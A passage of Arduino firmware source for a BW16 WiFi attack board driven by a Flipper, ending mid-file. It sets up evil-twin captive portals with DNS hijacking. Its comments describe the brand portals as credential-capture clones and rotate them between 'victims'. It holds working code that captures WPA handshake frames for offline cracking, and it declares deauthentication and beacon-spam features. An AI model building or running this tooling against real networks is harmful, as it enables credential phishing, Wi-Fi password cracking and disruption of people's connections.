#include <FreeRTOS.h>
#include "vector"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_drv.h"   // arduino_wifi_mode_check (Arduino's private mode cache)
#include "wifi_drv.h"
#include "debug.h"
#include "WiFi.h"
#include <BLEDevice.h>
#include <BLEAdvertData.h>
#include <BLEHIDDevice.h>
#include <BLEHIDKeyboard.h>

// Captive portals. The generic Default page ships in the public tree. The REAL-BRAND pages
// (facebook/amazon/apple/microsoft/google) are credential-capture clones; they ship ONLY in the
// complementary PRIVATE overlay repo (GitHub ToS / phishing + trademark liability). When those
// headers are absent, brand selections fall back to the neutral Default page.
#if __has_include("portals/compressed/facebook.h")
#define PETREL_BRAND_PORTALS 1
#include "portals/compressed/facebook.h"
#include "portals/compressed/amazon.h"
#include "portals/compressed/apple.h"
#include "portals/compressed/microsoft.h"
#include "portals/compressed/google.h"
#endif
#include "portals/default.h"

enum portals{
  Default,
  Facebook,
  Amazon,
  Apple,
  Microsoft,
  Google,
  Custom
};


//DNS

#include "dns.h"
#include "dhcp_captive.h"
#include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>
// D.4/2 serialized radio worker (architect ruling): the pinned core never compiles
// wifi_conf.c - wifi_on/wifi_off come from the prebuilt lib_arduino.a(wifi_conf.o) - so the
// lifecycle runs those REAL blocking calls on a one-shot worker task and keeps loop() responsive.
#include "FreeRTOS.h"
#include "task.h"
#include "queue.h"
#include "wlan_intf.h"   // rltk_wlan_running() + WLAN0_IDX/WLAN1_IDX: the source's own predicate

// M0.2: shared framed-binary transport contract (canonical in repo common/; build_petrel.sh
// copies it into the sketch folder so Arduino's sketch-local include can see it).
#include "petrel_proto.h"
// M3: passive WIDS detectors (pure, host-tested in common/wids_test.c; copied into the sketch too).
#include "wids.h"
// M4: raw-lwIP TCP HTTP listener for the WebUI (the Arduino WiFiServer accept is broken on the AP).
#include "web_lwip.h"
#include "sp_probe.h"

// Deferred log for the lwIP/tcpip thread (DHCP/DNS must not write the UART directly).
#include "lwip_log.h"
#include "petrel_http.h"   // channel validity (host-tested)

// Stop the SDK's built-in DHCP server (in lib_arduino.a) so our option-114 server
// can own UDP:67. Declared here to avoid pulling the whole dhcps.h.
extern "C" void dhcps_deinit(void);

#define MIN(a, b) ((a) < (b) ? (a) : (b))

#define BAUD 115200   // both UARTs: Serial=CH340 bulk, Serial1=Flipper control. 921600 on CH340
                      // came up silent on this CH340/macOS host — kept at 115200 (2026-10-18).

//PORTALS




typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
  int security;
} WiFiScanResult;


const char* rick_roll[8] = {
      "01 Never gonna give you up",
      "02 Never gonna let you down",
      "03 Never gonna run around",
      "04 and desert you",
      "05 Never gonna make you cry",
      "06 Never gonna say goodbye",
      "07 Never gonna tell a lie",
      "08 and hurt you"
};

// BEACONSPAM GHOST: a rotating set of "ghost"-flavoured SSIDs (5Ghost's Ghost AP Beacon).
static const char* ghost_ssids[8] = {
      "5Ghost", "Ghost_AP", "Free WiFi", "PINGEQUA",
      "GhostNet", "FreeWifi", "Ghost AP", "Connect"
};


std::vector<WiFiScanResult> scan_results;
// Driver scan completion. The driver task writes, loop() reads: release/acquire, not volatile.
static bool scan_done = false;
#define SCANDONE_LOAD()   __atomic_load_n(&scan_done, __ATOMIC_ACQUIRE)
#define SCANDONE_SET(v)   __atomic_store_n(&scan_done, (v), __ATOMIC_RELEASE)
// True while the driver may still be calling scanResultHandler. A timeout does NOT cancel the scan,
// so the next scan must wait for the old one before clearing the vector under it.
static bool scan_running = false;
std::vector<int> deauth_wifis, wifis_temp;
//WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;
bool randomSSID, rickroll, ghostSpam;
// Random source MAC for the RANDOM / RICKROLL beacon loops. It used to be a 19-byte text buffer
// written with 7 x 3 bytes (overflow) and then handed to tx_beacon_raw() as if it were binary.
static uint8_t randMac[6];
static void random_mac(uint8_t* m) {
  for (int i = 0; i < 6; i++) m[i] = (uint8_t)random(0, 256);
  m[0] = (uint8_t)((m[0] | 0x02) & 0xFE);   // locally administered, unicast
}
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int portal=0;
// C2: rotate the served portal on every captured credential (so successive victims get
// different pages). Toggled from the host with PORTALROT <0|1>.
static bool portal_rot = false;
int localPortNew=1000;
char wpa_pass[64];
char ap_channel[4];
bool secured=false;
//"00:E0:4C:01:02:03"
__u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
bool useCustomMac=false;
// Captive-portal host: a NAME derived from the AP SSID ("Free_Wifi" -> freewifi.com) so
// the portal is served as http://<host>/ instead of a bare IP. The DNS hijack resolves
// <host> (and every other name) to the AP, so DHCP option 114, the 302 Location and
// /cp.json all advertise this host.
char portalHost[64] = "portal.com";
char portalUrl[80]  = "http://portal.com/";
char cpUri[96]      = "http://portal.com/cp.json";

void build_portal_urls(const char* ssid){
  char s[48]; int n = 0;
  for (int i = 0; ssid && ssid[i] && n < 47; i++) {
    char c = ssid[i];
    if (c >= '0' && c <= '9')      s[n++] = c;
    else if (c >= 'a' && c <= 'z') s[n++] = c;
    else if (c >= 'A' && c <= 'Z') s[n++] = (char)(c - 'A' + 'a');
    // drop spaces, underscores, dots and anything else that is not [a-z0-9]
  }
  s[n] = 0;
  if (n == 0) strcpy(s, "portal");
  snprintf(portalHost, sizeof(portalHost), "%s.com", s);
  snprintf(portalUrl,  sizeof(portalUrl),  "http://%s/", portalHost);
  snprintf(cpUri,      sizeof(cpUri),      "http://%s/cp.json", portalHost);
  web_lwip_set_urls(portalUrl, cpUri);   // 302 Location + cp.json body must match DHCP option 114
  Serial.print("PORTAL host: "); Serial.println(portalHost);
}
//int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
extern u8 rtw_get_band_type(void);
// De rTV: wifi_get_ch_from_channel_set() is declared in wifi_conf.h but is NOT in this build's
// archive (undefined reference), so the channel-set query goes through the private ioctl instead.
// These two are present, checked with strings on the linked libraries before building.
extern int wifi_get_channel_plan(uint8_t *channel_plan);
extern int wext_private_command_with_retval(const char* ifname, char* cmd, char* ret, int len);
extern int wifi_change_channel_plan(uint8_t channel_plan);
#define FRAMES_PER_DEAUTH 5

// DFS (radar) 5GHz channels: RX-only, never TX deauth here (5Ghost does the same).
static bool is_dfs_channel(int ch) {
  return (ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144);
}

// Channel validity lives in common/petrel_http.h so the host tests can cover it.
static inline bool is_valid_tx_channel(int ch) { return petrel_chan_valid(ch) != 0; }

// SSID text is printed inside line protocols; a control byte would split the line and a '|' would
// shift every later field.
static void sanitize_text(const char* in, char* out, size_t cap) {
  size_t i = 0;
  for (; in && in[i] && i + 1 < cap; i++) {
    unsigned char c = (unsigned char)in[i];
    out[i] = (c >= 0x20 && c < 0x7F && c != '|') ? (char)c : '?';
  }
  out[i] = 0;
}

static int hexnib(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
//DNS
bool apActive = false;

// Custom portal: HTML streamed from the Flipper (SD file) via PORTALHTML hex chunks.
static char customPortal[6144];
// TEST 2026-10-28: Default is rebuilt by default_web(String(atSsid)) on EVERY request, inside the
// tcpip thread. Cache it once per AP start (loop context) so no String work happens per request.
static const char* g_def_cache = 0;   // BD_RAM_NS is the binding constraint; FAP caps uploads to match
static volatile uint16_t customPortalLen = 0;


int status = WL_IDLE_STATUS;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete != 0) {
    SCANDONE_SET(true);   // release: every pushed result is visible to loop()
    return RTW_SUCCESS;
  }
  {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    if(result.ssid.length()==0)result.ssid = String("<empty>");
    result.channel = record->channel;
    result.rssi = record->signal_strength;

    memcpy(&result.bssid, &record->BSSID, 6);
    // (no bssid_str here: it pointed at a local -> dangling. The LIST output formats the
    //  MAC itself with %02X, so the pointer was never needed.)
    result.security = record->security;
    // DP_SCAN_AP carries the index in a u8, so the list is capped at 255 entries.
    if (scan_results.size() < 255) scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}


// M4: board WebUI. When set, the SoftAP's raw-lwIP listener serves a READ-ONLY status page (live
// in-RAM state) at every path instead of a captive portal. webui_render is defined later (after the
// WIDS/harvest/evil-twin globals it reads), so it is forward-declared here.
static volatile bool webui_mode = false;
// Evil-twin / Create AP captive portal served via the raw-lwIP listener (web_lwip). Set while the
// AP is up; AT_HTTP picks the portal listener over the WebUI one.
static volatile bool web_portal_mode = false;
static volatile uint32_t link_last_line = 0;
static volatile uint32_t link_rx_bytes = 0;    // bytes read from Serial1
static volatile uint32_t link_lines = 0;       // complete lines parsed from either source   // millis() of the last PARSED command line (Serial1 or USB)
static void webui_render(char* b, size_t n);

// M4: RGB LED gate. While led_quiet (night mode - set by "LED OFF", cleared by "LED ON"/"LED r g b"),
// every LED write forces the LED OFF, so status blinks (channel hop, AP activity, ...) stay dark too.
// All status code writes LEDs through led_w(); the manual LED command sets/clears led_quiet.
static volatile bool led_quiet = false;
static inline void led_w(uint8_t pin, int val) {
  digitalWrite(pin, led_quiet ? LOW : (val ? HIGH : LOW));
}

// D.4/2 (architect): the legacy AP entry points forward into the cooperative lifecycle. The
// lifecycle itself lives right before loop(), where every feature global it must respect is in
// scope. Callers keep compiling against these declarations.
bool createAP(char *, char *, char *);
bool createAP(char *, char *);
void destroyAP();


int scanNetworks(int miliseconds) {
  DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
  // A previous scan that timed out is still delivering callbacks; clearing the vector under it
  // corrupted storage and let a late completion satisfy this scan. Wait for it first.
  if (scan_running) {
    uint32_t w0 = millis();
    while (!SCANDONE_LOAD() && (millis() - w0) < 3000u) delay(10);
    if (!SCANDONE_LOAD()) {
      DEBUG_SER_PRINT(" previous scan still running; skipping\n");
      return 1;
    }
    scan_running = false;
  }
  scan_results.clear();
  if (scan_results.capacity() < 64) scan_results.reserve(64);   // avoid realloc per push_back
  SCANDONE_SET(false);
  scan_running = true;
  DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
  DEBUG_SER_PRINT("scan results cleared...");
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    led_w(LED_B,false);
    // Wait for the DRIVER's completion signal (scan_done), not a fixed delay: the scan
    // routinely takes longer than `miliseconds`, and a premature SCAN:OK made the host's
    // immediately-following LIST race the results -> empty/partial list.
    uint32_t t0 = millis();
    uint32_t maxwait = (uint32_t)miliseconds + 5000u;
    while (!SCANDONE_LOAD() && (millis() - t0) < maxwait) {
      led_w(LED_G, !digitalRead(LED_G));
      delay(100);
    }
    led_w(LED_B,true);
    // Report a completion timeout. scan_done is the DRIVER's completion event: if it never arrives
    // the results are stale/partial, and returning success here silently produced an empty list
    // that the host could not distinguish from a real one.
    if(!SCANDONE_LOAD()) {
      DEBUG_SER_PRINT(" scan completion TIMEOUT after "+(String)maxwait+" ms (no scan_done)\n");
      return 1;   // scan_running stays true: the next scan waits for the driver
    }
    scan_running = false;
    DEBUG_SER_PRINT(" done! n="+(String)scan_results.size()+"\n");
    return 0;
  } else {
    scan_running = false;
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String readString;
// Per-source line buffers (see loop()). USB is the out-of-band control channel, Serial1 is the
// Flipper. Keeping them apart stops a partial line from one UART from merging with a line from the
// other, which could hand a command to the wrong branch of the chain below.
String cmdUsb;
String cmdFlip;
// Caps a runaway unterminated line. 2048, not 512: the portal upload sends its HTML as HEX in
// "PORTALHTML <hex>" lines of 256 bytes -> 512 hex chars plus the 11-char command word plus the
// newline is 524 bytes, so a 512 limit silently dropped every full chunk and broke the custom
// portal. Caught in review, not on hardware - a reminder that a size limit needs its largest real
// caller checked, not just "no command is that long".
#define CMD_LINE_MAX 2048

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  Serial.begin(BAUD);
  Serial1.begin(BAUD);
  readString.reserve(50);
  cmdUsb.reserve(50);
  cmdFlip.reserve(50);
  DEBUG_SER_PRINT("Iniciando\n");
  
  WiFi.enableConcurrent();
  WiFi.status();
  int channel;
  wifi_get_channel(&channel);

  led_w(LED_B, HIGH);
}
String ssid="";
uint32_t current_num = 0;

// --- F5: macro recording ---------------------------------------------------------------
// The board sees every command the app sends, in order, so it can record them itself. The app
// later fetches the list (RECFETCH) and saves it as a runnable F1 script, which means a macro is
// produced just by using the app normally. Housekeeping traffic (polls, handshakes, the
// recorder's own commands) is filtered out so the script only contains real actions.
#define REC_MAX 20
#define REC_LINE_LEN 48
static bool rec_on = false;
static char rec_lines[REC_MAX][REC_LINE_LEN];
static int rec_n = 0;

static void rec_note(const String& cmd) {
  if(!rec_on || rec_n >= REC_MAX) return;
  String c = cmd;
  c.replace("\n", "");
  if(c.length() == 0 || c.length() >= REC_LINE_LEN - 1) return;
  if(c.startsWith("REC")) return;          // the recorder's own commands
  if(c.startsWith("HELLO") || c.startsWith("PING")) return;
  if(c.startsWith("KARMALIST") || c.startsWith("TRAPSTAT") || c.startsWith("PORTALHASH")) return;
  strncpy(rec_lines[rec_n], c.c_str(), REC_LINE_LEN - 1);
  rec_lines[rec_n][REC_LINE_LEN - 1] = '\0';
  rec_n++;
  Serial1.print("RECN:");
  Serial1.println(rec_n);                  // live count, so the app can show progress
}

// --- Promisc spike (GATE test): does the BW16 driver actually deliver data/EAPOL
// frames to the promisc callback, or only mgmt? If data+EAPOL flow, handshake/PMKID/
// station-enum ports are feasible; if not, they're off the table. RTW_PROMISC_ENABLE
// + len_used=1 delivers Ethernet frames, so EAPOL shows up as ethertype 0x888e. ---
static volatile uint32_t pm_total = 0, pm_mgmt = 0, pm_ctrl = 0, pm_data = 0, pm_eapol = 0;

// --- P5: WPA 4-way handshake capture -------------------------------------------
// When `hs_cap` is set, every EAPOL (802.1X) data frame seen on the monitored channel
// is copied verbatim (full 802.11 header, no FCS) into a small RAM ring. After the
// capture window we stream the raw frames over Serial/Serial1 as `HSFRAME:<hex>` lines
// so the host can rebuild a LINKTYPE_IEEE802_11 pcap (see firmware-build/hs_to_pcap.py).
// Gate result proving this is viable: ch2 -> total=1208 mgmt=750 data=458 eapol=0
// (data/metrics flow; eapol=0 only because no full 4-way occurred in the passive window).
#define HS_MAX 8           // frames kept per capture (a full 4-way is 4; trimmed 12->8 to free
                           // BD_RAM_NS for the M4 offensive + raw-lwIP WebUI BSS; holds 2 handshakes)
#define HS_FRAME_MAX 256   // per-frame byte cap
// Cross-task: the promiscuous callback writes, loop() reads/arms. Atomic accessors below.
static bool hs_cap = false;
static uint16_t hs_count = 0;
#define HSCAP_ON()      __atomic_load_n(&hs_cap, __ATOMIC_ACQUIRE)
#define HSCAP_SET(v)    __atomic_store_n(&hs_cap, (v), __ATOMIC_RELEASE)
#define HSCOUNT_LOAD()  __atomic_load_n(&hs_count, __ATOMIC_ACQUIRE)
#define HSCOUNT_SET(v)  __atomic_store_n(&hs_count, (v), __ATOMIC_RELEASE)
static uint8_t hs_frames[HS_MAX][HS_FRAME_MAX];
static uint16_t hs_lens[HS_MAX];
// Selected-AP capture binding. hsg_start()/PMKIDCLIENT set these; the promisc callbacks then store
// ONLY the pinned BSSID's EAPOL/PMKID, so a channel-wide handshake from another AP cannot pollute
// (or falsely complete) the target's capture. Declared here (before promisc_spike_cb) so the
// callbacks can see them; the rest of the hsg_* grab state lives lower. Passive CAPTURE / PMKID
// scans clear hsg_target_set = keep everything. Guard: never filter before a target is set.
static uint8_t hsg_bssid[6];
static volatile bool hsg_target_set = false;

// --- M0.2: live sniffer stream — bounded SPSC record ring + framer ------------
// Producer = promisc_spike_cb (WiFi-driver task context); consumer = framer_drain() in loop().
// Lock-free SPSC: producer owns tail, consumer owns head. ARMv8-M (Cortex-M33) is weakly
// ordered, so a DMB fences the slot writes before the index publish — `volatile` alone is NOT
// enough here (the hs_frames path skips barriers only because capture->readout is human-gated;
// a free-running stream races continuously). Ring full -> drop NEWEST, count it, and surface the
// count via DP_FRAME_DROP so an overrun is visible to the operator (the whole point of M0.2).
// Static RAM in BD_RAM_NS is scarce (~2 KB headroom): the ring must stay small. 4 power-of-two
// slots (3 usable) fit with margin. At 115200 the Serial drain is the bottleneck (~43 frame/s),
// so the ring only absorbs micro-bursts; sustained load drops (DP_FRAME_DROP makes that visible)
// until the pending 921600 baud upgrade. Growing the ring is gated on TIER-0.1 (trim static BSS).
#define FRM_SLOTS 4u               // power-of-two; 3 usable (one slot kept empty for SPSC)
#define FRM_SLOT  256u             // per-frame capture cap (matches HS_FRAME_MAX)
// Acquire/release accessors: volatile alone is not synchronization on this weakly-ordered part.
#define FRM_LOAD(p)   __atomic_load_n((p), __ATOMIC_ACQUIRE)
#define FRM_STORE(p, v) __atomic_store_n((p), (v), __ATOMIC_RELEASE)
#define SNIFF_ON()      __atomic_load_n(&sniff_stream, __ATOMIC_ACQUIRE)
#define SNIFF_SET(v)    __atomic_store_n(&sniff_stream, (v), __ATOMIC_RELEASE)
static uint8_t  frm_buf[FRM_SLOTS][FRM_SLOT];
static uint16_t frm_caplen[FRM_SLOTS];   // bytes actually captured in the slot
static uint16_t frm_orig[FRM_SLOTS];     // on-air frame length (>= caplen when truncated)
static uint32_t frm_ts[FRM_SLOTS];       // millis() at capture
static uint16_t frm_head = 0, frm_tail = 0;
static uint32_t frm_drop = 0;
static bool sniff_stream = false;   // cross-task: atomic accessors below

static inline void frm_push(const unsigned char *b, unsigned int len) {
  uint16_t t = FRM_LOAD(&frm_tail);
  uint16_t nt = (uint16_t)((t + 1) & (FRM_SLOTS - 1));
  if (nt == FRM_LOAD(&frm_head)) { __atomic_add_fetch(&frm_drop, 1u, __ATOMIC_RELAXED); return; }
  uint16_t n = (len < FRM_SLOT) ? (uint16_t)len : (uint16_t)FRM_SLOT;  // clamp like L466
  memcpy(frm_buf[t], b, n);
  frm_caplen[t] = n;
  frm_orig[t]   = (len > 0xFFFFu) ? 0xFFFFu : (uint16_t)len;
  frm_ts[t]     = millis();
  FRM_STORE(&frm_tail, nt);                                   // release: slot published before tail
}

// RTW_PROMISC_ENABLE_2 (raw 802.11): buf[0] = frame control. type bits (buf[0]>>2)&3:
// 0=mgmt 1=ctrl 2=data. EAPOL rides in a data frame after the 802.11 hdr + LLC/SNAP,
// ethertype 0x888e at offset 30 (non-QoS) or 32 (QoS data).
static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (len < 1) return;
  if (SNIFF_ON()) frm_push(buf, len);   // M0.2: live stream gets every frame (all types)
  pm_total++;
  uint8_t ftype = (buf[0] >> 2) & 0x3;
  if (ftype == 0) pm_mgmt++;
  else if (ftype == 1) pm_ctrl++;
  else if (ftype == 2) {
    pm_data++;
    if ((len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) ||
        (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e) ||
        (len >= 38 && buf[36] == 0x88 && buf[37] == 0x8e)) {   // + QoS+HT Control header
      pm_eapol++;
      // Keep the whole frame (M1..M4) for offline cracking. memcpy only — this runs in
      // the driver/WiFi task, so no String/heap work here.
      if (HSCAP_ON() && HSCOUNT_LOAD() < HS_MAX) {
        // Target binding: a pinned grab stores ONLY the selected AP's EAPOL. BSSID = addr1 when
        // ToDS (STA->AP), addr2 when FromDS (AP->STA), addr3 in an IBSS (neither bit set, where
        // addr3 IS the BSSID). No target set -> keep everything (CAPTURE).
        uint8_t ds = buf[1] & 0x03;
        const uint8_t* fb = (ds == 0x01) ? buf + 4 : (ds == 0x02) ? buf + 10 : buf + 16;
        if (!hsg_target_set || memcmp(fb, hsg_bssid, 6) == 0) {
          uint16_t n = (len < HS_FRAME_MAX) ? (uint16_t)len : (uint16_t)HS_FRAME_MAX;
          uint16_t hc = HSCOUNT_LOAD();
          memcpy(hs_frames[hc], buf, n);
          hs_lens[hc] = n;
          HSCOUNT_SET((uint16_t)(hc + 1));   // release: frame published before the count
        }
      }
    }
  }
}

// Dump the captured EAPOL frames as hex lines the host tool turns into a .pcap.
static void hs_stream(int ch) {
  uint16_t n = HSCOUNT_LOAD();
  String hdr = "HSCAP: ch=" + String(ch) + " count=" + String((unsigned)n);
  Serial.println(hdr); Serial1.println(hdr);
  for (uint16_t i = 0; i < n; i++) {
    String line = "HSFRAME:";
    line.reserve(2 * hs_lens[i] + 12);
    for (uint16_t j = 0; j < hs_lens[i]; j++) {
      char b[3];
      snprintf(b, sizeof(b), "%02x", hs_frames[i][j]);
      line += b;
    }
    Serial.println(line); Serial1.println(line);
  }
  String fin = "HSDONE:" + String((unsigned)n);
  Serial.println(fin); Serial1.println(fin);
}

// M0.2: consumer — drain queued frames to the CH340 bulk link as DP_FRAME binary frames, and
// surface the overrun count as DP_FRAME_DROP. Called every loop() pass. While sniff_stream is
// armed the board emits ONLY binary on Serial (the command gate routes any other reply to
// Serial1), so DP_FRAME bytes never interleave with legacy ASCII on the bulk channel.
static void framer_drain(void) {
  while (FRM_LOAD(&frm_head) != FRM_LOAD(&frm_tail)) {
    uint16_t h = FRM_LOAD(&frm_head);            // acquire: slot visible after the index
    uint8_t  rec[PETREL_FRAMEREC_HDR + FRM_SLOT];
    uint8_t  out[PETREL_FRAME_MAX];
    size_t   rn = petrel_framerec(frm_ts[h], frm_orig[h], frm_buf[h], frm_caplen[h], rec);
    size_t   n  = petrel_encode(DP_FRAME, rec, (uint16_t)rn, out);
    if (n) Serial.write(out, n);
    FRM_STORE(&frm_head, (uint16_t)((h + 1) & (FRM_SLOTS - 1)));   // release: slot drained
  }
  static uint32_t last_drop = 0, last_ms = 0;
  uint32_t d = FRM_LOAD(&frm_drop), now = millis();
  if (d != last_drop && (now - last_ms) >= 200u) {
    uint8_t p[4] = { (uint8_t)d, (uint8_t)(d >> 8), (uint8_t)(d >> 16), (uint8_t)(d >> 24) };
    uint8_t out[PETREL_FRAME_MAX];
    size_t  n = petrel_encode(DP_FRAME_DROP, p, 4, out);
    if (n) Serial.write(out, n);
    last_drop = d; last_ms = now;
  }
}

// --- P1: channel hop ---
static volatile bool hopping = false;
static volatile uint32_t hop_interval_ms = 500;
// Mutable so the host can choose the plan (HOPCH). The default is 2.4 GHz only; a dual-band plan is
// e.g. "HOPCH 1,6,11,36,40,44,48". Hopping is receive-side, so DFS channels are allowed here (only
// TX refuses them) - but note the board has ONE radio: an active softAP and a hopping receiver
// cannot both be right, and the mode change tears the AP down. That is the operator's call.
static uint8_t hop_channels[24] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
static volatile uint8_t hop_count = 13;

// --- P2: PMF/WPA3 classification from the RSN IE of beacons / probe responses ---
// The scan API (rtw_scan_result_t, wifi_structures.h) exposes only a coarse security
// bitmask, so 802.11w MFP required/capable and SAE must be read from the RSN IE
// (tag 48). We harvest it from promisc and report per-BSSID. RSN capabilities bits:
// B6 = MFPR (required), B7 = MFPC (capable). AKM suite type 8 = SAE, 9 = FT-SAE.
#define PMF_MAX_APS 16
typedef struct {
  uint8_t bssid[6];
  char ssid[33];
  uint16_t caps;  // RSN capabilities
  uint8_t sae;    // SAE / FT-SAE present
  uint8_t n_akm;
} pmf_ap_t;
static pmf_ap_t pmf_aps[PMF_MAX_APS];
static uint8_t pmf_n = 0;   // cross-task: atomic accessors below
#define PMFN_LOAD()  __atomic_load_n(&pmf_n, __ATOMIC_ACQUIRE)
#define PMFN_SET(v)  __atomic_store_n(&pmf_n, (v), __ATOMIC_RELEASE)

static void pmf_parse(const uint8_t* f, unsigned len) {
  if (len < 36) return;
  uint8_t st = (f[0] >> 4) & 0xF;
  if (st != 8 && st != 5) return;           // beacon / probe response only
  const uint8_t* bssid = f + 16;            // addr3 == BSSID
  char ssid[33];
  ssid[0] = 0;
  uint16_t rcaps = 0;
  int have_rsn = 0, sae = 0, nakm = 0;
  unsigned i = 36;                          // 24-byte mgmt hdr + 12-byte fixed params
  while (i + 2 <= len) {
    uint8_t id = f[i], l = f[i + 1];
    unsigned d = i + 2;
    if (d + l > len) break;
    if (id == 0) {                          // SSID
      uint8_t n = l < 32 ? l : 32;
      memcpy(ssid, f + d, n);
      ssid[n] = 0;
    } else if (id == 48 && l >= 8) {        // RSN IE
      unsigned p = d + 2;                   // skip version
      p += 4;                               // group cipher suite
      if (p + 2 <= d + l) {
        uint16_t pc = f[p] | (f[p + 1] << 8);
        p += 2 + 4 * (unsigned)pc;          // pairwise count + suites
      }
      if (p + 2 <= d + l) {
        uint16_t ac = f[p] | (f[p + 1] << 8);
        p += 2;
        for (int k = 0; k < ac && p + 4 <= d + l; k++, p += 4) {
          uint8_t t = f[p + 3];
          if (t == 8 || t == 9) sae = 1;
          nakm++;
        }
      }
      if (p + 2 <= d + l) rcaps = f[p] | (f[p + 1] << 8);
      have_rsn = 1;
    }
    i = d + l;
  }
  if (!have_rsn) return;
  uint8_t n = PMFN_LOAD();
  for (uint8_t k = 0; k < n; k++)
    if (!memcmp(pmf_aps[k].bssid, bssid, 6)) return;   // already seen
  if (n >= PMF_MAX_APS) return;
  pmf_ap_t* a = &pmf_aps[n];
  memcpy(a->bssid, bssid, 6);
  memcpy(a->ssid, ssid, sizeof(a->ssid));
  a->caps = rcaps;
  a->sae = sae;
  a->n_akm = nakm;
  PMFN_SET((uint8_t)(n + 1));   // release: record published before the count
}

static void promisc_pmf_cb(unsigned char* buf, unsigned int len, void* userdata) {
  (void)userdata;
  pmf_parse(buf, len);
}

static void pmf_stream(int ch) {
  uint8_t n = PMFN_LOAD();
  for (uint8_t k = 0; k < n; k++) {
    pmf_ap_t* a = &pmf_aps[k];
    const char* mfp = (a->caps & 0x0040) ? "req" : (a->caps & 0x0080) ? "cap" : "no";
    char line[128], safe[33];
    sanitize_text(a->ssid, safe, sizeof(safe));   // '|' / control bytes would break the fields
    snprintf(line, sizeof(line),
      "PMF:%02X:%02X:%02X:%02X:%02X:%02X|%s|akm=%u|sae=%u|mfp=%s",
      a->bssid[0], a->bssid[1], a->bssid[2], a->bssid[3], a->bssid[4], a->bssid[5],
      safe, (unsigned)a->n_akm, (unsigned)a->sae, mfp);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "PMFDONE: ch=" + String(ch) + " aps=" + String((unsigned)n);
  Serial.println(fin); Serial1.println(fin);
}

// --- P4: STASCAN — enumerate stations associated to a BSSID from promisc ------
// No RSSI here: the promisc callback only gets (buf, len) — the driver strips the
// radiotap header — so we report MAC + frame count only.
#define STA_MAX 24
typedef struct { uint8_t mac[6]; uint16_t count; } sta_t;
static sta_t sta_list[STA_MAX];
// Cross-task: the promiscuous callback appends, loop() reads (STADONE/BTMSTAS). Publish with
// release, read with acquire, so a reader that sees the count also sees the MAC it counts.
static uint8_t sta_n = 0;
#define STA_LOAD()      __atomic_load_n(&sta_n, __ATOMIC_ACQUIRE)
#define STA_STORE(v)    __atomic_store_n(&sta_n, (v), __ATOMIC_RELEASE)
static uint8_t sta_filter[6];
static bool sta_filter_on = false;   // cross-task: atomic accessors below
#define STAF_LOAD()   __atomic_load_n(&sta_filter_on, __ATOMIC_ACQUIRE)
#define STAF_SET(v)   __atomic_store_n(&sta_filter_on, (v), __ATOMIC_RELEASE)

static void sta_add(const uint8_t* mac) {
  uint8_t n = STA_LOAD();
  for (uint8_t i = 0; i < n; i++)
    if (!memcmp(sta_list[i].mac, mac, 6)) {
      __atomic_add_fetch(&sta_list[i].count, 1u, __ATOMIC_RELAXED);
      return;
    }
  if (n >= STA_MAX) return;
  memcpy(sta_list[n].mac, mac, 6);
  sta_list[n].count = 1;
  STA_STORE((uint8_t)(n + 1));
}

static void promisc_sta_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if (len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t st = (buf[0] >> 4) & 0xF;
  uint8_t tods = buf[1] & 0x01, fromds = (buf[1] >> 1) & 0x01;
  const uint8_t *a1 = buf + 4, *a2 = buf + 10, *a3 = buf + 16;
  const uint8_t* sta = NULL;
  if (ftype == 2) {                                    // data
    if (tods && !fromds) { if (STAF_LOAD() && memcmp(a1, sta_filter, 6)) return; sta = a2; }
    else if (!tods && fromds) { if (STAF_LOAD() && memcmp(a2, sta_filter, 6)) return; sta = a1; }
    else return;                                       // IBSS / WDS — ambiguous
  } else if (ftype == 0) {                             // mgmt: auth(11)/assoc-req(0)/reassoc-req(2)
    if (st != 11 && st != 0 && st != 2) return;
    if (STAF_LOAD() && memcmp(a3, sta_filter, 6)) return;
    sta = a2;
  } else return;
  if (sta && !(sta[0] & 0x01)) sta_add(sta);           // skip multicast/broadcast
}

// --- A2: client tracker ----------------------------------------------------------
// Timeline of the devices seen on a channel: any probe/auth/assoc/data frame identifies a device,
// and we keep MAC -> first seen, last seen, how often. This SDK's promisc callback carries no
// RSSI, so v1 tracks presence and timing only. TRACK <chan> [secs] streams
// CLI:<mac>|<first-s>|<last-s>|<count> and ends with CLIDONE:<n>.
#define CLI_MAX 10
